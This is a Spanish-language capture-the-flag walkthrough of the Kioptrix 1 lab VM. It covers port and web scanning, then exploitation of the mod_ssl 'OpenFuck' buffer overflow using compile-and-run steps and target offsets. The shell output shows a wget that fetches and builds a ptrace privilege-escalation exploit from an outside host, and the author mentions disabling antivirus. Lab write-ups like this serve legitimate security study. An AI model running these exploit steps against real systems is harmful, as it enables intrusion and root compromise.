---
layout: post
title: Kioptrix1 - Walkthrough
date: 2020-01-30 20:44
description: Walkthrough - Kioptrix 1
toc: true
comments: true
tags: 
 - OSCP

---

## **Walkthrough de Kioptrix 1**
---

## **Links**
[Kioptrix 1 en Vulnhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)


## **Reconocimiento**
---
>**`nmap -T4 -p- 10.0.0.107`**

```console
Nmap scan report for 10.0.0.107
Host is up (0.0034s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
443/tcp  open  https
1024/tcp open  kdm
MAC Address: 00:0C:29:7C:D6:7E (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
```

>**`nmap -A -T4 -p 22,80,111,139,443,1024  10.0.0.107 -oA kioptrix1`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-02 14:36 AKST
Nmap scan report for 10.0.0.107
Host is up (0.00011s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2020-02-03T00:39:52+00:00; +1h01m49s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:7C:D6:7E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_clock-skew: 1h01m48s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.11 ms 10.0.0.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.10 seconds
```

### **Protocolo SSH**

>**``ssh 10.0.0.107``**

```console
Unable to negotiate with 10.0.0.107 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```
La conexión por SSH funciona pero hay un error de cifrado, voy a averiguar sobre esto más adelante.

### **Protocolo HTTP (80 y 443)**

>**``nikto -h 10.0.0.107``**

```console
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.107
+ Target Hostname:    10.0.0.107
+ Target Port:        80
+ Start Time:         2020-02-03 15:16:08 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 00:12:46 2001
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashi
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any pro
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).
+ OSVDB-3268: /manual/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ 8698 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2020-02-03 15:16:33 (GMT-3) (25 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

>**``dirb http://10.0.0.107``**

```console
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Feb  3 15:16:34 2020
URL_BASE: http://10.0.0.107/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.0.0.107/ ----
+ http://10.0.0.107/~operator (CODE:403|SIZE:273)
+ http://10.0.0.107/~root (CODE:403|SIZE:269)
+ http://10.0.0.107/cgi-bin/ (CODE:403|SIZE:272)
+ http://10.0.0.107/index.html (CODE:200|SIZE:2890)
==> DIRECTORY: http://10.0.0.107/manual/
==> DIRECTORY: http://10.0.0.107/mrtg/
==> DIRECTORY: http://10.0.0.107/usage/

---- Entering directory: http://10.0.0.107/manual/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.0.0.107/mrtg/ ----
+ http://10.0.0.107/mrtg/index.html (CODE:200|SIZE:17318)

---- Entering directory: http://10.0.0.107/usage/ ----
+ http://10.0.0.107/usage/index.html (CODE:200|SIZE:3704)

-----------------
END_TIME: Mon Feb  3 15:17:00 2020
DOWNLOADED: 13836 - FOUND: 6
```
### **Resultado del Reconocimiento**


 - Apache versión 1.3.20 en puertos 80 y 443.
 - Sistema operativo Red Hat.
 - Multi Router Traffic Grapher (MRTG 2.9.6) corriendo.
 - Webalizer 2.01 corriendo.
 - **mod_ssl/2.8.4 que podría permitir RCE.**
 - Pareciera que un Wordpress está corriendo pero no encontré la raiz del sitio.

## **Explotación**

Voy a ir por el camino más simple, en este caso es buscar vulnerabilidad para `Apache mod_ssl`. El comando searchsploit busca vulnerabilidades según la cadena de texto que se escriba a continuación del comando. En este caso la búsqueda va a ser mod_ssl 2.8, basado en la versión de mod_ssl que me facilitó NMAP.

> **`searchsploit mod_ssl 2.8.`**

```console
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title | Path
               | (/usr/share/exploitdb/)
---------------------------------------------------------------------------- ---------------------------------
Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                  | exploits/multiple/dos/21575.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow        | exploits/unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)  | exploits/unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)  | exploits/unix/remote/47080.c
---------------------------------------------------------------------------- ---------------------------------
```

Bien, hay 1 una vulnerabilidad que solo sirve para hacer una ataque de DOS, como en este caso la idea es lograr escalar hacia el usuario root entonces esa vulnerabilidad no va a servir. Solo quedan 3 y son bastante parecidas además de ser remotas, voy a ir con `Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)` la ruta es `exploits/unix/remote/764.c` y la manera más fácil de llegar al código fuente es ejecutando el comando `searchsploit` seguido del parámetro `-m` y el número asignado a la vulnerabilidad, en este caso `764`. Este parámetro permite copiar el código fuente de la vulnerabilidad en la carpeta donde se está parado.

>**`searchsploit -m 764`**

```console
 Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)
      URL: https://www.exploit-db.com/exploits/764
     Path: /usr/share/exploitdb/exploits/unix/remote/764.c
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /root/764.c
```
Una vez que tenemos el código fuente de exploit solo resta compilarlo, asegurarse de tener instalado `GCC` y `libssl-dev` o va a fallar la compilación.

Bien, obviamente la compilación falló. Resulta que el código fuente está desactualizado y es jodido compilarlo con la versión de gcc y libssl de hoy en día (2020) así que me bajé una versión de Kali de 2016 que es más o menos el año en el cual se creó está VM y la compilación siguiió fallando.

Finalmente al googlear 5 minutos aparecieron dos páginas que me ayudaron:

* [OpenLuck](https://github.com/heltonWernik/OpenLuck) Este tipo (Helton Wernik) se tomó el tiempo de actualizar el código fuente además de dar instrucciones para su compilación:
    1. Download OpenFuck.c
    : git clone https://github.com/heltonWernik/OpenFuck.git

    2. Install ssl-dev library
    : apt-get install libssl-dev

    3. It's Compile Time
    : gcc -o OpenFuck OpenFuck.c -lcrypto

    4. Running the Exploit
    : ./OpenFuck

```console
*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./OpenFuck target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
```


Acá es donde se vuelve importante la versión de sistema operativo y Apache que enumeramos previamente:
```console
0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
```

Voy a ir por la primera, el comando es:

>**`./OpenFuck 0x6a 100.0.0.107 -c 50`**

Después de 20 intentos me pasé a la segunda opción:

>**`./OpenFuck 0x6b 100.0.0.107 -c 50`**


20 intentos después y logré lo siguiente:

```console
Connection... 50 of 50
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$
exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304-
--21:46:59--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:80... connected!
HTTP request sent, awaiting response... 200 OK
Length: 959 [text/html]

    0K                                                       100% @ 936.52 KB/s

21:47:05 (936.52 KB/s) - `ptrace-kmod.c' saved [959/959]

ptrace-kmod.c:1: parse error before `<'
ptrace-kmod.c:5: nondigits in number and not hexadecimal
ptrace-kmod.c:5: nondigits in number and not hexadecimal
ptrace-kmod.c:5: nondigits in number and not hexadecimal
ptrace-kmod.c:5: nondigits in number and not hexadecimal
ptrace-kmod.c:6: syntax error before `{'
ptrace-kmod.c:6: nondigits in number and not hexadecimal
ptrace-kmod.c:6: nondigits in number and not hexadecimal
ptrace-kmod.c:7: syntax error before `{'
ptrace-kmod.c:7: nondigits in number and not hexadecimal
ptrace-kmod.c:7: nondigits in number and not hexadecimal
ptrace-kmod.c:8: syntax error before `{'
ptrace-kmod.c:8: nondigits in number and not hexadecimal
ptrace-kmod.c:8: nondigits in number and not hexadecimal
ptrace-kmod.c:9: nondigits in number and not hexadecimal
ptrace-kmod.c:9: nondigits in number and not hexadecimal
ptrace-kmod.c:9: nondigits in number and not hexadecimal
ptrace-kmod.c:9: nondigits in number and not hexadecimal
bash: ./p: No such file or directory
bash-2.05$
```

Genial, a ver si se consigue el root...

```console
bash-2.05$ whoami
whoami
apache
```

Claro que no, estoy con el usuario apache. Este problema es porque el epxloit, para ser completado, se tiene que descargar un archivo llamado `ptrace-kmod.c` más arriba se ven las advertencias.

Existen dos opciones para hacer que funcione, se descarga manualmente el código fuente o se modifica el link de descarga y se recompila OpenFuck. Por el momento quiero descargarlo de manera manual y compilarlo con la linea de comandos limitada que logré.

la URL que funcionó es la siguiente `http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c`

Ok. nada de eso funcionó. Resulta que el AV de mi PC estaba tomando como malicioso el link de descarga del código fuente, lo desactivé y más o menos funcionó:

```console
Connection... 50 of 50
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$
exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304-
--22:24:53--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:80... connected!
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
--22:24:54--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,921 [text/x-csrc]

    0K ...                                                   100% @   3.74 MB/s

22:24:54 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]

/usr/bin/ld: cannot open output file p: Permission denied
collect2: ld returned 1 exit status
^[[A^[[B
/bin/sh: : command not found
whoami
**root**
```


Ahora solo resta encontrar la bandera...

>**`cat /var/mail/root`**

```console
From root  Sat Sep 26 11:42:10 2009
Return-Path: <root@kioptix.level1>
Received: (from root@localhost)
        by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831
        for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400
Date: Sat, 26 Sep 2009 11:42:10 -0400
From: root <root@kioptix.level1>
Message-Id: <200909261542.n8QFgAZ01831@kioptix.level1>
To: root@kioptix.level1
Subject: About Level 2
Status: O

If you are reading this, you got root. Congratulations.
Level 2 won't be as easy...

From root  Sun Feb  2 19:17:15 2020
Return-Path: <root@kioptrix.level1>
Received: (from root@localhost)
        by kioptrix.level1 (8.11.6/8.11.6) id 0130HFP01124
        for root; Sun, 2 Feb 2020 19:17:15 -0500
Date: Sun, 2 Feb 2020 19:17:15 -0500
From: root <root@kioptrix.level1>
Message-Id: <202002030017.0130HFP01124@kioptrix.level1>
To: root@kioptrix.level1
Subject: LogWatch for kioptrix.level1



 ################## LogWatch 2.1.1 Begin #####################


 ###################### LogWatch End #########################
```




